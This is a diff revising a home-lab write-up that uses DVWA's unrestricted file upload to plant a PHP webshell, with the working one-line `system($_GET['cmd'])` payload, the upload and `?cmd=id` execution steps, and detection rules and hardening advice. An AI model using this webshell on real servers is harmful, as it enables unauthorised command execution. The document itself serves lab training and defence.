@@ -7,7 +7,7 @@
 
 ## Objective
 
-Leverage an unrestricted file upload vulnerability within the web application to deploy an interactive PHP web shell onto the web server, establishing persistent backdoor access and verifying remote arbitrary command execution on the underlying operating system.
+Take advantage of an unrestricted file upload flaw in DVWA to drop a simple PHP webshell onto the server, verify we can run commands remotely, and establish our first code-execution foothold.
 
 ## Commands
 
@@ -27,14 +27,9 @@ curl -s "http://192.168.56.30/hackable/uploads/shell.php?cmd=id"
 
 ## What happened
 
-1. **Web Shell Payload Generation**: On the attacker machine (`192.168.232.135`), a compact single-line PHP backdoor was constructed using `echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php`. This payload takes system command strings passed via the `cmd` GET parameter and passes them directly to the underlying Linux shell via PHP's native `system()` function.
-2. **Unrestricted File Upload**: Authenticated as `admin`, the attacker accessed the DVWA File Upload interface (`http://192.168.56.30/vulnerabilities/upload/#`). The form was provided `/tmp/shell.php` and submitted. The application performed no file extension validation, MIME-type verification, or magic byte checks, writing the file directly into the server's web directory and confirming:
-   `../../hackable/uploads/shell.php succesfully uploaded!`
-3. **Execution Verification & Identity Confirmation**: The attacker requested the newly uploaded script via HTTP GET:
-   `http://192.168.56.30/hackable/uploads/shell.php?cmd=id`
-   The Apache web server passed the request to the PHP interpreter, which executed the Linux `id` binary. The command output was rendered directly to the browser screen:
-   `uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)`
-   This established verified remote command execution under the privileges of the web daemon account (`www-data`).
+1. **Writing the webshell:** On the Kali attack machine (`192.168.232.135`), I created a classic one-line PHP backdoor: `echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php`. When called, it takes whatever string is passed in the `cmd` URL parameter and hands it straight to Linux using PHP's built-in `system()` function.
+2. **Uploading through the browser:** Logged in as `admin`, I opened DVWA's File Upload page (`/vulnerabilities/upload/`) and uploaded `/tmp/shell.php`. The application didn't validate file extensions, MIME types, or contents—it happily dropped the script right into the web folder and returned: `../../hackable/uploads/shell.php succesfully uploaded!`.
+3. **Running our first command:** To prove remote code execution, I requested the uploaded file with `?cmd=id`: `http://192.168.56.30/hackable/uploads/shell.php?cmd=id`. Apache handed the request to PHP, which ran `id` and printed the output directly on screen: `uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)`. We now had arbitrary command execution on the Linux host as the `www-data` web account.
 
 ## Evidence
 
@@ -82,13 +77,13 @@ curl -s "http://192.168.56.30/hackable/uploads/shell.php?cmd=id"
 
 ## Detection opportunities
 
-- **Endpoint File Integrity Monitoring (FIM)**: Wazuh Syscheck configured on web root directories (`/var/www/html/hackable/uploads/`) to trigger real-time alerts upon the creation or modification of executable web scripts (`.php`, `.phtml`, `.phar`).
-- **Endpoint Process Tree Monitoring (Auditd / Sysmon Linux)**: Detection rules alerting on web server worker processes (`apache2`, `httpd`, `php-fpm`) spawning shell interpreters (`/bin/sh`, `/bin/bash`, `/bin/dash`) or system discovery utilities (`id`, `whoami`, `uname`, `cat /etc/passwd`).
-- **Network IDS Payload Inspection**: Suricata signatures alerting on HTTP POST payloads containing dangerous PHP function calls (`system(`, `exec(`, `passthru(`, `shell_exec(`), as well as HTTP GET requests invoking parameter keys like `?cmd=` or `?exec=`.
-- **Attack Response Inspection**: Network IDS signatures monitoring outbound HTTP server responses for characteristic Unix command output strings (e.g., `uid=.*gid=.*groups=.*`).
-- **Web Server Hardening**: Disabling PHP execution within user-writable upload directories via Apache configurations (`php_flag engine off` in `.htaccess` or directory blocks) or mounting upload partitions with the `noexec` attribute.
+- **File Integrity Monitoring (FIM):** Turn on Wazuh Syscheck with real-time alerting on upload directories (`/var/www/html/.../uploads/`). Web applications should never allow newly uploaded `.php` or `.phtml` files without triggering an alert.
+- **Process Lineage Anomaly Detection:** Web server daemons (`apache2`, `php-fpm`) should never spawn shell binaries or system commands like `/usr/bin/id`, `whoami`, or `cat /etc/passwd`. Auditd rule `web_process_creation` flagged `id` immediately.
+- **Network Signatures on POST and GET:** Suricata caught both the PHP system tags in the POST upload body and the suspicious `?cmd=` query parameter in the GET request.
+- **Outbound HTTP Response Inspection:** Suricata signature `ET ATTACK_RESPONSE Output of id command from HTTP server` caught the `uid=33(www-data)` string leaving the web server in the HTTP response.
+- **Lock Down Upload Folders (The Real Fix):** Disable PHP execution completely inside upload folders (`php_flag engine off` in Apache) or mount upload directories with `noexec` so uploaded scripts cannot execute.
 
 ## Notes
 
-- The unrestricted file upload vulnerability allowed persistent arbitrary code execution without requiring administrative OS shell credentials.
-- The web shell serves as the pivot mechanism for spawning an interactive reverse shell back to the attack station in Stage 06.
+- Unrestricted file upload gave us instant remote code execution without needing any OS credentials.
+- This webshell became our stepping stone to launch an interactive Netcat reverse shell in Stage 06.
